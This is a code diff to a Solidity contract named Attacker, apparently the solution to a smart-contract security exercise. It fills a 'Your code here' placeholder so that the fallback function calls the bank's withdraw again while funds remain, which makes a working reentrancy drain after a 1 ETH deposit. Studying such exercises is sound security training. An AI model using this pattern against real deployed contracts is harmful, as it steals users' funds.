@@ -33,15 +33,17 @@ contract Attacker {
 
     // Fallback is called when bank sends Ether to this contract.
     fallback() external payable {
-        
-        // Your code here.
-        
+        console.log('Withdrawing again from fallback');
+        // Your code here
+        if(address(bank).balance >= 1 ether) {
+          bank.withdraw();
+        }
     }
 
     function attack() external payable {
         console.log('The attack starts!');
-
         require(msg.value >= 1 ether, "We need at least 1 ETH to attack...");
+        console.log('Attacker deposits 1 ETH first');
         bank.deposit{value: 1 ether}();
         bank.withdraw();
     }
